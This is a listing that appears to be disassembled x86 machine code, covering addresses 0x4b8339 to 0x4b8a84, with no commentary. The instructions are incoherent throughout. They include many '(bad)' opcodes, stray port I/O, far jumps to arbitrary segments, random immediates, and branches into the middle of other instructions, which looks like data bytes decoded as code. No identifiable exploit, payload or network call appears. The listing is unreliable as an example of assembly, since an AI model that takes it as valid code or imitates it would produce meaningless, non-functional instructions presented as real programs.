  4b8339:	sub    DWORD PTR [ebx+ebp*1-0x47],esi
  4b833d:	mov    ds:0x45ad0501,al
  4b8342:	mov    ebp,DWORD PTR [edi+0x14ac75a3]
  4b8348:	inc    edi
  4b8349:	push   0xffffff9e
  4b834b:	repnz dec esp
  4b834d:	les    esi,FWORD PTR [eax-0x12b0bb56]
  4b8353:	enter  0x2c80,0x48
  4b8357:	and    BYTE PTR [eax-0x793d0fbc],bh
  4b835d:	enter  0x2357,0xb8
  4b8361:	add    ch,0xa
  4b8364:	push   esi
  4b8365:	dec    ebp
  4b8366:	sub    DWORD PTR [ebx+0x2f],ecx
  4b8369:	adc    ebx,eax
  4b836b:	inc    ebx
  4b836c:	and    BYTE PTR [edi-0x46dabc47],cl
  4b8372:	xor    BYTE PTR [ebx],0x58
  4b8375:	adc    eax,0x159a0228
  4b837a:	mov    dl,BYTE PTR [esi+edx*2]
  4b837d:	sbb    BYTE PTR [ebx-0x7f0a5f50],al
  4b8383:	mov    ds:0x7fa90c5d,eax
  4b8388:	mov    BYTE PTR [edx],bl
  4b838a:	add    DWORD PTR [esp+ecx*2+0x29],edx
  4b838e:	cmp    BYTE PTR ds:0x746085c0,0x43
  4b8395:	add    BYTE PTR [ebx],dl
  4b8397:	and    BYTE PTR [esi+esi*4],bh
  4b839a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b839b:	sbb    ah,BYTE PTR [esi+0x71b61268]
  4b83a1:	sbb    esi,DWORD PTR [ecx]
  4b83a3:	xor    ecx,ecx
  4b83a5:	adc    BYTE PTR [ecx],dh
  4b83a7:	mov    eax,ds:0x6ea13474
  4b83ac:	inc    esp
  4b83ad:	xor    BYTE PTR [eax-0x7ae83b2a],al
  4b83b3:	std    
  4b83b4:	stos   DWORD PTR es:[edi],eax
  4b83b5:	js     0x4b83fb
  4b83b7:	call   0xbd3f9c49
  4b83bc:	(bad)
  4b83c0:	out    0x9c,al
  4b83c2:	fld    QWORD PTR [edx-0x49]
  4b83c5:	lods   eax,DWORD PTR ds:[esi]
  4b83c6:	aam    0x20
  4b83c8:	jno    0x4b8430
  4b83ca:	jae    0x4b8353
  4b83cc:	mov    ebp,0xcd271b4b
  4b83d1:	es pop edi
  4b83d3:	adc    BYTE PTR [edx],dl
  4b83d5:	push   ebp
  4b83d6:	ins    DWORD PTR es:[edi],dx
  4b83d7:	push   esp
  4b83d8:	sub    eax,0x5262e7e2
  4b83dd:	add    ah,ch
  4b83df:	inc    BYTE PTR [ebx-0x67]
  4b83e2:	dec    edx
  4b83e3:	add    eax,0x1075390b
  4b83e8:	jne    0x4b840b
  4b83ea:	push   es
  4b83eb:	mov    eax,ds:0xebe0068f
  4b83f0:	pop    esi
  4b83f1:	sbb    ecx,eax
  4b83f3:	xchg   BYTE PTR [ebx-0x2688e9da],bh
  4b83f9:	push   es
  4b83fa:	test   dl,bh
  4b83fc:	into   
  4b83fd:	popf   
  4b83fe:	inc    esi
  4b83ff:	xor    eax,0x753de43
  4b8404:	imul   edx,ebp,0xb4084c3d
  4b840a:	idiv   BYTE PTR [eax]
  4b840c:	xor    al,0x86
  4b840e:	mov    esi,0xc2c304d6
  4b8413:	ja     0x4b841d
  4b8415:	jmp    0x4b848f
  4b8417:	sub    edx,edi
  4b8419:	push   ecx
  4b841a:	xchg   esp,eax
  4b841b:	xor    DWORD PTR [ecx],edx
  4b841d:	xchg   ecx,eax
  4b841e:	cmc    
  4b841f:	mov    DWORD PTR [ecx+0x3c],ecx
  4b8422:	cdq    
  4b8423:	cmp    BYTE PTR [ecx],cl
  4b8425:	jae    0x4b842d
  4b8427:	sub    cl,BYTE PTR [eax]
  4b8429:	cmp    eax,0x250d513d
  4b842e:	push   ss
  4b842f:	xchg   ch,cl
  4b8431:	mov    ah,0x6f
  4b8433:	push   edx
  4b8434:	and    eax,0xc148bc
  4b8439:	add    BYTE PTR [ebp+0x42d1a72],ah
  4b843f:	pop    esi
  4b8440:	les    ecx,FWORD PTR [edx-0x7a]
  4b8443:	xchg   ebx,eax
  4b8444:	bound  ebp,QWORD PTR [esi+0x41b02055]
  4b844a:	adc    eax,DWORD PTR ds:0xc15c4938
  4b8450:	bswap  esi
  4b8452:	aas    
  4b8453:	push   eax
  4b8454:	sub    DWORD PTR [esi],esp
  4b8456:	jno    0x4b83f2
  4b8458:	ret    
  4b8459:	test   DWORD PTR [ecx-0x75],0x60ee247a
  4b8460:	mov    ah,0x59
  4b8462:	sub    al,0x3a
  4b8464:	stos   BYTE PTR es:[edi],al
  4b8465:	(bad)  
  4b8466:	pop    edx
  4b8467:	or     bl,BYTE PTR [ebp-0x549dfbd5]
  4b846d:	stc    
  4b846e:	retf   
  4b846f:	jae    0x4b8491
  4b8471:	push   edx
  4b8472:	push   edi
  4b8473:	setp   BYTE PTR [eax]
  4b8476:	add    al,al
  4b8478:	(bad)  
  4b8479:	xor    DWORD PTR [ecx-0x3855297f],esi
  4b847f:	jmp    esi
  4b8481:	xor    esi,DWORD PTR [ecx-0x19]
  4b8484:	enter  0x392,0xba
  4b8488:	ret    0x45b8
  4b848b:	je     0x4b84ee
  4b848d:	sbb    al,0x47
  4b848f:	frstor [edx]
  4b8491:	adc    dl,al
  4b8493:	mov    bl,0x2d
  4b8495:	push   0x56e441e1
  4b849a:	push   edi
  4b849b:	cld    
  4b849c:	je     0x4b84af
  4b849e:	mov    ebx,0x960e92de
  4b84a3:	in     eax,dx
  4b84a4:	(bad)  
  4b84a5:	sbb    BYTE PTR [ecx],ah
  4b84a7:	jne    0x4b8520
  4b84a9:	arpl   WORD PTR [edx],dx
  4b84ab:	pop    edi
  4b84ac:	dec    ebx
  4b84ad:	mov    ah,0x4e
  4b84af:	js     0x4b84d1
  4b84b1:	sub    eax,0xdde33b08
  4b84b6:	add    DWORD PTR [eax-0x2f],ebx
  4b84b9:	push   esp
  4b84ba:	leave  
  4b84bb:	mov    ebp,0x8802788
  4b84c0:	loopne 0x4b84b4
  4b84c2:	call   0x5e58:0xc2de09d
  4b84c9:	adc    BYTE PTR [edx],bl
  4b84cb:	inc    esp
  4b84cc:	sbb    BYTE PTR [ecx],0x1a
  4b84cf:	fcom   DWORD PTR [eax+0x6b09227d]
  4b84d5:	ins    BYTE PTR es:[edi],dx
  4b84d6:	and    al,0x85
  4b84d8:	out    dx,al
  4b84d9:	add    eax,0x8b9dded5
  4b84de:	in     eax,0xbf
  4b84e0:	inc    ebp
  4b84e1:	or     ecx,DWORD PTR [esi+0x56]
  4b84e4:	push   edx
  4b84e5:	push   edi
  4b84e6:	test   al,0xe3
  4b84e8:	and    dl,BYTE PTR [esi]
  4b84ea:	inc    esi
  4b84eb:	push   ecx
  4b84ec:	xchg   BYTE PTR [ecx],bl
  4b84ee:	daa    
  4b84ef:	mov    eax,ds:0x56361787
  4b84f4:	push   ecx
  4b84f5:	rcr    DWORD PTR [ebx-0x5d19727f],cl
  4b84fb:	push   ebp
  4b84fc:	lods   al,BYTE PTR ds:[esi]
  4b84fd:	(bad)  
  4b84fe:	retf   
  4b84ff:	inc    esp
  4b8500:	in     al,0xc5
  4b8502:	and    eax,DWORD PTR [edi+esi*4-0x5af9ad53]
  4b8509:	dec    ecx
  4b850a:	sub    al,0x15
  4b850c:	cmp    cl,BYTE PTR [eax]
  4b850e:	and    eax,0x553382c1
  4b8513:	and    al,0x85
  4b8515:	or     BYTE PTR es:[eax],bh
  4b8518:	jne    0x4b8518
  4b851a:	sub    DWORD PTR [ebp+0x790abf69],0xeb317412
  4b8524:	cmp    dh,BYTE PTR [ebp-0x5104f9df]
  4b852a:	push   0x60eaa315
  4b852f:	add    al,0x8b
  4b8531:	push   es
  4b8532:	cdq    
  4b8533:	loop   0x4b852d
  4b8535:	adc    eax,0x481682c5
  4b853a:	push   edi
  4b853b:	push   eax
  4b853c:	dec    eax
  4b853d:	call   0x22828973
  4b8542:	fdiv   st,st(7)
  4b8544:	dec    edi
  4b8545:	or     BYTE PTR [ebx],bh
  4b8547:	cmp    eax,0x74505646
  4b854c:	mov    bl,0x99
  4b854e:	xor    BYTE PTR [edx+0x5914491a],dh
  4b8554:	xchg   esi,eax
  4b8555:	mov    al,BYTE PTR [eax-0x20]
  4b8558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b8559:	or     BYTE PTR [ebp+0x1c],al
  4b855c:	xchg   DWORD PTR [edx],eax
  4b855e:	mov    dh,BYTE PTR [eax+0x61]
  4b8561:	sub    ch,dl
  4b8563:	inc    esi
  4b8564:	and    dl,BYTE PTR [eax]
  4b8566:	dec    eax
  4b8567:	add    al,0x51
  4b8569:	ins    DWORD PTR es:[edi],dx
  4b856a:	sub    BYTE PTR [eax],bh
  4b856c:	pop    edx
  4b856d:	rcl    BYTE PTR [ebx-0x1e],0x98
  4b8571:	inc    eax
  4b8572:	bound  eax,QWORD PTR [esi*4+0x112e5e66]
  4b8579:	jb     0x4b8551
  4b857b:	add    DWORD PTR [eax+ebx*1],edx
  4b857e:	and    al,0x86
  4b8580:	dec    ebx
  4b8581:	test   BYTE PTR [ecx-0x788bdbf8],dh
  4b8587:	sbb    cl,BYTE PTR [edi]
  4b8589:	mov    es,WORD PTR [esi-0x57fc479f]
  4b858f:	mov    ah,0x9c
  4b8591:	addr16 or al,0x1c
  4b8594:	test   BYTE PTR [edi+0x15474a06],bh
  4b859a:	sub    eax,0x12039c0d
  4b859f:	sub    al,0xa0
  4b85a1:	test   eax,0x80ca44a6
  4b85a6:	fadd   DWORD PTR [ebx+0x38]
  4b85a9:	jne    0x4b8550
  4b85ab:	into   
  4b85ac:	mov    ah,0xe
  4b85ae:	outs   dx,BYTE PTR ds:[esi]
  4b85af:	clc    
  4b85b0:	outs   dx,DWORD PTR ds:[esi]
  4b85b1:	(bad)  
  4b85b3:	and    al,0xb6
  4b85b5:	push   eax
  4b85b6:	je     0x4b85cf
  4b85b8:	push   esi
  4b85b9:	dec    esi
  4b85ba:	adc    DWORD PTR [edx-0x7be6a1b3],eax
  4b85c0:	sbb    bh,BYTE PTR [eax-0x71]
  4b85c3:	dec    esi
  4b85c4:	sbb    BYTE PTR [ebp+0x20],al
  4b85c7:	pusha  
  4b85c8:	outs   dx,DWORD PTR ds:[esi]
  4b85c9:	ret    0x632e
  4b85cc:	push   ebx
  4b85cd:	push   DWORD PTR [ebx+ecx*4]
  4b85d0:	sbb    eax,0x807a369e
  4b85d5:	jnp    0x4b85c7
  4b85d7:	ficom  WORD PTR ds:0xa430b641
  4b85dd:	mov    al,es:0x825682ec
  4b85e3:	rcr    BYTE PTR [edx],0x6d
  4b85e6:	cmp    al,BYTE PTR [eax]
  4b85e8:	sbb    DWORD PTR [eax-0x7bd0a9a1],ebp
  4b85ee:	inc    edx
  4b85ef:	jo     0x4b858a
  4b85f1:	or     eax,0xa89e4a1a
  4b85f6:	jge    0x4b85fd
  4b85f8:	sub    al,BYTE PTR [edi+0x5adf894d]
  4b85fe:	inc    edx
  4b85ff:	call   0x1b69fcdf
  4b8604:	or     BYTE PTR [ecx],bl
  4b8606:	jp     0x4b8675
  4b8608:	add    ecx,DWORD PTR [eax+0x5]
  4b860b:	mov    eax,ss
  4b860d:	jp     0x4b867d
  4b860f:	pop    edi
  4b8610:	or     eax,eax
  4b8612:	sub    BYTE PTR [ecx],ch
  4b8614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b8615:	mov    ecx,0x845b6864
  4b861a:	ins    DWORD PTR es:[edi],dx
  4b861b:	mov    ch,0x1f
  4b861d:	les    ebp,FWORD PTR ds:0x10625000
  4b8623:	mov    al,0x7b
  4b8625:	retf   
  4b8626:	jmp    0xb857:0x7a9c0603
  4b862d:	mov    edx,DWORD PTR [edi+0x6e27021a]
  4b8633:	pop    edi
  4b8634:	push   0x935cb68a
  4b8639:	mov    DWORD PTR [ecx],ecx
  4b863b:	and    BYTE PTR [edi],ch
  4b863d:	outs   dx,BYTE PTR ds:[esi]
  4b863e:	add    ecx,ebx
  4b8640:	das    
  4b8641:	push   esp
  4b8642:	and    al,0x64
  4b8644:	push   edx
  4b8645:	mov    edi,0x5ea4358
  4b864a:	pop    esp
  4b864b:	dec    esp
  4b864c:	sub    al,0x20
  4b864e:	sub    BYTE PTR [ecx+ebp*8],ah
  4b8651:	fistp  DWORD PTR [eax+0x27]
  4b8654:	mov    ah,0xb2
  4b8656:	(bad)  
  4b8657:	and    ch,BYTE PTR [edi+edi*4]
  4b865a:	adc    dh,al
  4b865c:	out    dx,eax
  4b865d:	cmp    al,0x63
  4b865f:	pop    eax
  4b8660:	jmp    0x5070:0x38548153
  4b8667:	test   DWORD PTR [ecx+eax*1+0x538d084c],0x4e00c0c9
  4b8672:	push   ss
  4b8673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b8674:	sub    eax,0x15300964
  4b8679:	fimul  DWORD PTR [edx+0x6c]
  4b867c:	aam    0xf3
  4b867e:	call   0x640:0x763c8cd2
  4b8685:	inc    esp
  4b8686:	dec    eax
  4b8687:	adc    dl,BYTE PTR [eax+0x5a]
  4b868a:	xchg   BYTE PTR [ebx],cl
  4b868c:	inc    esp
  4b868d:	sub    DWORD PTR fs:[eax-0x10710510],esp
  4b8694:	repz bound ebx,QWORD PTR [eax]
  4b8697:	cmp    DWORD PTR [eax+0x3c8906ab],0x24
  4b869e:	push   0x35da574b
  4b86a3:	add    al,0xdd
  4b86a5:	test   al,0x74
  4b86a7:	xor    ah,BYTE PTR [eax]
  4b86a9:	cmp    eax,DWORD PTR [ecx+0xa]
  4b86ac:	out    dx,eax
  4b86ad:	mov    ah,0xc6
  4b86af:	pop    esp
  4b86b0:	sar    BYTE PTR [eax+0x406c0040],0xed
  4b86b7:	jmp    0x4b86f9
  4b86b9:	or     BYTE PTR [ebp+0x54e353c6],cl
  4b86bf:	inc    esi
  4b86c0:	aaa    
  4b86c1:	sub    bl,bh
  4b86c3:	xchg   edi,eax
  4b86c4:	lods   eax,DWORD PTR ds:[esi]
  4b86c5:	jl     0x4b8653
  4b86c7:	add    eax,0x82c30f03
  4b86cc:	dec    edx
  4b86cd:	or     al,0x37
  4b86cf:	mov    esi,0x4417c292
  4b86d4:	cmp    al,0x41
  4b86d6:	and    eax,0x5a12075
  4b86db:	jle    0x4b8728
  4b86dd:	push   ds
  4b86de:	adc    BYTE PTR [edx+0x25],ch
  4b86e1:	clc    
  4b86e2:	clc    
  4b86e3:	mov    cl,0x3b
  4b86e5:	pusha  
  4b86e6:	sub    ecx,DWORD PTR [edx+0x39569599]
  4b86ec:	pop    esp
  4b86ed:	jne    0x4b8754
  4b86ef:	inc    esi
  4b86f0:	imul   edx,DWORD PTR [edx],0xc0e513a7
  4b86f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b86f7:	sub    ebx,DWORD PTR [ebx]
  4b86f9:	lods   eax,DWORD PTR ds:[esi]
  4b86fa:	jmp    0x4b86d1
  4b86fc:	xor    bh,ah
  4b86fe:	lods   al,BYTE PTR ds:[esi]
  4b86ff:	and    DWORD PTR [edx-0x274655f3],ebp
  4b8705:	mov    DWORD PTR ds:0xd6a830a,esi
  4b870b:	pop    ds
  4b870c:	or     DWORD PTR [esi],ebx
  4b870e:	nop
  4b870f:	nop
  4b8710:	or     ebx,DWORD PTR [edx+edi*4+0x3b]
  4b8714:	mov    eax,DWORD PTR [edi+0x4]
  4b8717:	aam    0x6
  4b8719:	pop    esp
  4b871a:	cmp    edi,0xffffff9b
  4b871d:	and    ebp,0x0
  4b8720:	inc    edx
  4b8721:	push   esi
  4b8722:	push   eax
  4b8723:	pop    eax
  4b8724:	cwde   
  4b8725:	adc    al,0x6c
  4b8727:	aam    0xc3
  4b8729:	push   eax
  4b872a:	dec    edi
  4b872b:	lock dec esp
  4b872d:	ins    DWORD PTR es:[edi],dx
  4b872e:	adc    bh,BYTE PTR [ebx-0x2c9a3732]
  4b8734:	xor    ebx,DWORD PTR [ebx+0x643d4d00]
  4b873a:	shl    BYTE PTR [ebp+0x32],0xab
  4b873e:	cmp    BYTE PTR [esi],0x3
  4b8741:	jp     0x4b876d
  4b8743:	jo     0x4b8746
  4b8745:	enter  0x504c,0xa1
  4b8749:	outs   dx,BYTE PTR ds:[esi]
  4b874a:	or     ch,BYTE PTR [edx+0x5453666a]
  4b8750:	cmp    eax,0xef30c891
  4b8755:	and    DWORD PTR [ecx+0x3a4c3c44],ebp
  4b875b:	mov    WORD PTR [edx],?
  4b875d:	outs   dx,DWORD PTR ds:[esi]
  4b875f:	push   eax
  4b8760:	xchg   ecx,eax
  4b8761:	jmp    0x4b87a5
  4b8763:	jecxz  0x4b8778
  4b8765:	xchg   ebp,eax
  4b8766:	or     DWORD PTR ds:0x1d880476,0xbb2de4c8
  4b8770:	dec    ecx
  4b8771:	enter  0x9264,0x6
  4b8775:	ror    BYTE PTR [ebx-0x3a],1
  4b8778:	push   esi
  4b8779:	(bad)  
  4b877a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b877b:	cmc    
  4b877c:	and    DWORD PTR [edi+0x28],0x1e
  4b8780:	sbb    eax,0x6f1696a0
  4b8785:	xchg   esi,eax
  4b8786:	ror    BYTE PTR [ebx-0x76],0x10
  4b878a:	test   DWORD PTR [edi+0x35f0376],eax
  4b8790:	js     0x4b8764
  4b8792:	and    al,0x2f
  4b8794:	sahf   
  4b8795:	cli    
  4b8796:	cmp    edx,DWORD PTR [ebx-0x41]
  4b8799:	mov    ah,0x89
  4b879b:	adc    eax,0xf2198cdc
  4b87a0:	jnp    0x4b87a6
  4b87a2:	jge    0x4b87b3
  4b87a4:	or     edx,DWORD PTR [ebx+eax*1]
  4b87a7:	push   eax
  4b87a8:	je     0x4b8813
  4b87aa:	push   esi
  4b87ab:	mov    edx,0x478d0108
  4b87b0:	addr16 inc esi
  4b87b2:	out    dx,eax
  4b87b3:	xor    BYTE PTR [ecx+0x7c03fd88],bl
  4b87b9:	sub    DWORD PTR [eax-0x3ae0ecd6],edx
  4b87bf:	les    esp,FWORD PTR [eax-0x75]
  4b87c2:	pop    eax
  4b87c3:	sbb    dh,BYTE PTR [esi+0x1c]
  4b87c6:	push   ecx
  4b87c7:	adc    esp,DWORD PTR [ebx+ebp*8]
  4b87ca:	jl     0x4b876a
  4b87cc:	xlat   BYTE PTR ds:[ebx]
  4b87cd:	lock mov edi,edi
  4b87d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b87d1:	test   al,0x22
  4b87d3:	jne    0x4b87db
  4b87d5:	test   DWORD PTR [ebp+0x609aa999],edx
  4b87db:	dec    eax
  4b87dc:	dec    ecx
  4b87dd:	mov    WORD PTR [edi],ds
  4b87df:	faddp  st(4),st
  4b87e1:	xor    BYTE PTR [ebp+esi*8+0x12ff3e1e],dh
  4b87e8:	es fdivr st(3),st
  4b87eb:	dec    esi
  4b87ec:	dec    edx
  4b87ed:	mov    WORD PTR [edi-0x65],ss
  4b87f0:	push   ebp
  4b87f1:	xchg   edx,eax
  4b87f2:	mov    ds:0x218b0165,eax
  4b87f7:	adc    eax,0xb74a840
  4b87fc:	add    al,BYTE PTR [ecx]
  4b87fe:	pop    ss
  4b87ff:	dec    edx
  4b8800:	je     0x4b8807
  4b8802:	popa   
  4b8803:	imul   edx,edx,0x6d2c48d2
  4b8809:	inc    eax
  4b880a:	in     al,0x56
  4b880c:	cmc    
  4b880d:	rcr    DWORD PTR [eax-0x3f],cl
  4b8810:	push   ebp
  4b8811:	adc    al,0x72
  4b8813:	pop    ss
  4b8814:	and    eax,DWORD PTR [eax]
  4b8816:	test   eax,0x70841b26
  4b881b:	adc    dl,BYTE PTR [esi]
  4b881d:	loope  0x4b8820
  4b881f:	jl     0x4b8826
  4b8821:	fidivr WORD PTR [esi+0x1e]
  4b8824:	std    
  4b8825:	inc    ebx
  4b8826:	loope  0x4b87df
  4b8828:	push   ecx
  4b8829:	(bad)  [esi*2+0x2031567f]
  4b8830:	fisttp WORD PTR ds:[edi+0x4e6a9b76]
  4b8837:	je     0x4b881b
  4b8839:	je     0x4b8818
  4b883b:	pop    ebp
  4b883c:	fild   DWORD PTR [eax+0x21daf099]
  4b8842:	adc    BYTE PTR [esi+0x18],dh
  4b8845:	and    BYTE PTR [edi-0x622df475],al
  4b884b:	xor    BYTE PTR [ebp+0x26dbbf10],0xde
  4b8852:	add    al,0xa1
  4b8854:	cwde   
  4b8855:	inc    ecx
  4b8856:	sbb    ebp,DWORD PTR [edx+0x17]
  4b8859:	les    edx,FWORD PTR [ebx+0x1]
  4b885c:	test   BYTE PTR [edx-0x34],bl
  4b885f:	ret    
  4b8860:	(bad)  
  4b8861:	cli    
  4b8862:	(bad)  
  4b8863:	je     0x4b8878
  4b8865:	or     al,0x59
  4b8867:	or     BYTE PTR [ecx+ebx*1],cl
  4b886a:	mov    BYTE PTR [edi+edx*1+0x1],bl
  4b886e:	xor    BYTE PTR [esi+ebx*1+0x2c1d040],0x3
  4b8876:	push   cs
  4b8877:	ret    0xf6da
  4b887a:	jg     0x4b888b
  4b887c:	(bad)  
  4b887d:	ins    BYTE PTR es:[edi],dx
  4b887e:	jnp    0x4b889f
  4b8880:	mov    cl,0x75
  4b8882:	hlt    
  4b8883:	cwde   
  4b8884:	push   esi
  4b8885:	fwait
  4b8886:	sub    al,0xdf
  4b8888:	cmp    BYTE PTR [ebp*4-0x5b341eec],ch
  4b888f:	lods   al,BYTE PTR ds:[esi]
  4b8890:	push   0x63b613a4
  4b8895:	push   edx
  4b8896:	mov    edx,0x1e5e7ae9
  4b889b:	or     edx,DWORD PTR [ecx-0x42]
  4b889e:	je     0x4b88e1
  4b88a0:	or     BYTE PTR [ecx+eiz*8],bl
  4b88a3:	pushf  
  4b88a4:	sub    ecx,DWORD PTR [ebp+ebx*2+0x5c]
  4b88a8:	adc    BYTE PTR [ebx-0x6e5aa5f4],dh
  4b88ae:	cmp    BYTE PTR [ebx+0x3c20bae5],bl
  4b88b4:	push   edx
  4b88b5:	pop    ebp
  4b88b6:	push   edx
  4b88b7:	dec    ebx
  4b88b8:	out    0x21,al
  4b88ba:	sbb    eax,0xfb82efa4
  4b88bf:	add    DWORD PTR [eax-0x6abb5f6f],esp
  4b88c5:	push   esi
  4b88c6:	popa   
  4b88c7:	add    al,0x29
  4b88c9:	ficomp WORD PTR [ecx+0x1e]
  4b88cc:	fdivr  QWORD PTR [eax]
  4b88ce:	xchg   DWORD PTR [edx],ebx
  4b88d0:	loopne 0x4b8884
  4b88d2:	or     BYTE PTR [ebx],0x72
  4b88d5:	data16 adc BYTE PTR [eax],ch
  4b88d8:	mov    bh,0x81
  4b88da:	push   ebx
  4b88db:	pusha  
  4b88dc:	aaa    
  4b88dd:	fild   DWORD PTR [edi+0x5df0676f]
  4b88e3:	add    BYTE PTR [edx],ch
  4b88e5:	in     al,dx
  4b88e6:	into   
  4b88e7:	popf   
  4b88e8:	mov    ebx,DWORD PTR [edx+0x2e007402]
  4b88ee:	or     bh,BYTE PTR [edx]
  4b88f0:	or     al,0xfc
  4b88f2:	cs cdq 
  4b88f4:	mov    edx,0x1e181d2
  4b88f9:	xchg   ebx,eax
  4b88fa:	inc    BYTE PTR [ecx+0x74]
  4b88fd:	sub    al,0xc1
  4b88ff:	add    ecx,DWORD PTR [edx+0x10]
  4b8902:	dec    ebp
  4b8903:	jl     0x4b8954
  4b8905:	xchg   DWORD PTR [ebp+eiz*8+0x4485c752],edx
  4b890c:	jmp    0x5476e1e
  4b8911:	femms  
  4b8913:	pop    es
  4b8914:	cmp    DWORD PTR [ebp-0x3d],esp
  4b8917:	loop   0x4b88fc
  4b8919:	sbb    eax,0x9632b4fa
  4b891e:	and    BYTE PTR [esi+0x3b],dh
  4b8921:	and    al,0x68
  4b8923:	add    eax,0xe9895be1
  4b8928:	and    BYTE PTR [ecx-0x54],al
  4b892b:	lods   eax,DWORD PTR ds:[esi]
  4b892c:	mov    esi,DWORD PTR [edi]
  4b892e:	scas   eax,DWORD PTR es:[edi]
  4b892f:	sbb    ch,BYTE PTR [esp+ebx*2]
  4b8932:	test   DWORD PTR [ebx-0x66d05328],edi
  4b8938:	mov    edx,0xd7da0050
  4b893d:	mov    eax,edi
  4b893f:	shl    DWORD PTR ds:0xa124230b,cl
  4b8945:	push   eax
  4b8946:	or     BYTE PTR es:[edi],0xa4
  4b894a:	add    DWORD PTR [esi-0x5ef8eb78],edx
  4b8950:	xor    BYTE PTR [eax+0xb5472cf],cl
  4b8956:	retf   
  4b8957:	sbb    BYTE PTR [eax-0x1b833ef0],dh
  4b895d:	add    ebp,edi
  4b895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b8960:	xor    BYTE PTR [eax],0x3
  4b8963:	lahf   
  4b8964:	cmovb  ebx,DWORD PTR [eax+0x2a]
  4b8968:	ins    BYTE PTR es:[edi],dx
  4b8969:	sub    BYTE PTR [eax],dl
  4b896b:	dec    ecx
  4b896c:	add    DWORD PTR [ecx+0x10698fc0],ebx
  4b8972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b8973:	stos   DWORD PTR es:[edi],eax
  4b8974:	jecxz  0x4b899a
  4b8976:	xor    BYTE PTR [ebx],dh
  4b8978:	push   ecx
  4b8979:	shr    DWORD PTR gs:[eax+0x7a],cl
  4b897d:	and    al,0x21
  4b897f:	ja     0x4b898f
  4b8981:	jl     0x4b8990
  4b8983:	jmp    0x4b8928
  4b8985:	(bad)  
  4b8987:	and    edx,DWORD PTR [ebx+0x3934cb83]
  4b898d:	test   al,0x20
  4b898f:	lea    ecx,ds:0x80ef082b
  4b8995:	(bad)  
  4b8996:	cmp    esi,eax
  4b8998:	adc    DWORD PTR ds:0x34a9a184,0x8821917a
  4b89a2:	dec    ebp
  4b89a3:	enter  0x7ed9,0xaf
  4b89a7:	push   eax
  4b89a8:	push   0xffffffb2
  4b89aa:	mov    cl,al
  4b89ac:	push   ebx
  4b89ad:	xchg   ah,bh
  4b89af:	fdiv   DWORD PTR [ecx]
  4b89b1:	mov    edi,DWORD PTR [eax+0x55]
  4b89b4:	shr    bl,cl
  4b89b6:	or     BYTE PTR [edi+0x34],dl
  4b89b9:	pop    eax
  4b89ba:	add    eax,esp
  4b89bc:	xchg   edi,eax
  4b89bd:	mov    ebx,0x2a901002
  4b89c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b89c3:	xchg   ebx,eax
  4b89c4:	dec    ecx
  4b89c5:	jmp    0x8ddea255
  4b89ca:	mov    gs,WORD PTR [eax+0x4b]
  4b89cd:	inc    edi
  4b89ce:	xchg   edx,eax
  4b89cf:	js     0x4b8a3e
  4b89d1:	fcomi  st,st(2)
  4b89d3:	loop   0x4b89d8
  4b89d5:	rol    BYTE PTR [eax-0x59],cl
  4b89d8:	fst    QWORD PTR [ecx+0x20]
  4b89db:	ja     0x4b899f
  4b89dd:	sbb    al,BYTE PTR [ecx+edi*2]
  4b89e0:	cld    
  4b89e1:	push   0xfffffff0
  4b89e3:	dec    ecx
  4b89e4:	push   0xfffffffd
  4b89e6:	into   
  4b89e7:	cmp    al,ch
  4b89e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b89ea:	outs   dx,BYTE PTR ds:[esi]
  4b89eb:	stos   BYTE PTR es:[edi],al
  4b89ec:	mov    dl,0xef
  4b89ee:	cld    
  4b89ef:	adc    DWORD PTR [ebx],esi
  4b89f1:	cmc    
  4b89f2:	daa    
  4b89f3:	dec    eax
  4b89f4:	jmp    0x4b8a6c
  4b89f6:	mov    ecx,DWORD PTR [edi-0x1f]
  4b89f9:	jne    0x4b8a0b
  4b89fb:	push   edi
  4b89fc:	sbb    bl,0x66
  4b89ff:	push   esi
  4b8a00:	mov    ds:0x1860e099,eax
  4b8a05:	arpl   WORD PTR [edi-0x28],dx
  4b8a08:	bound  eax,QWORD PTR [edx]
  4b8a0a:	cmp    cl,al
  4b8a0c:	(bad)  
  4b8a0d:	imul   ebp,ebx,0xe02c511e
  4b8a13:	sub    BYTE PTR [edx+ebp*8+0x286d026d],cl
  4b8a1a:	lahf   
  4b8a1b:	dec    ebp
  4b8a1c:	lods   al,BYTE PTR ds:[esi]
  4b8a1d:	or     DWORD PTR [esp+esi*1+0x25c17a42],esp
  4b8a24:	sub    eax,0x622a1c53
  4b8a29:	cld    
  4b8a2a:	mov    esi,DWORD PTR [esi+eax*2-0x1f]
  4b8a2e:	jmp    0x4b89b6
  4b8a30:	mov    ebp,0xc93ba428
  4b8a35:	jmp    0x4b8a63
  4b8a37:	and    eax,DWORD PTR [edx]
  4b8a39:	jno    0x4b89ee
  4b8a3b:	push   ecx
  4b8a3c:	jne    0x4b8a63
  4b8a3e:	mov    ah,0xf0
  4b8a40:	rcr    DWORD PTR [eax],0x51
  4b8a43:	mov    esi,0xe9109420
  4b8a48:	test   DWORD PTR [edi+eiz*4],eax
  4b8a4b:	and    DWORD PTR [edx+eax*2+0x56],0x71608716
  4b8a53:	ins    DWORD PTR es:[edi],dx
  4b8a54:	jne    0x4b8a5f
  4b8a56:	or     eax,0x244d0964
  4b8a5b:	push   0xf9c54518
  4b8a60:	dec    esp
  4b8a61:	sbb    eax,0x215dca40
  4b8a66:	or     BYTE PTR [eax-0x76],al
  4b8a69:	aas    
  4b8a6a:	gs pop eax
  4b8a6c:	or     BYTE PTR [esi-0x1c9f3180],dh
  4b8a72:	pop    edx
  4b8a73:	popf   
  4b8a74:	pop    ds
  4b8a75:	dec    eax
  4b8a76:	push   ds
  4b8a77:	dec    eax
  4b8a78:	pushf  
  4b8a79:	mov    ecx,DWORD PTR [esi]
  4b8a7b:	cs push ss
  4b8a7d:	punpcklwd mm1,DWORD PTR ds:0x76c19d4a
  4b8a84:	inc    esp
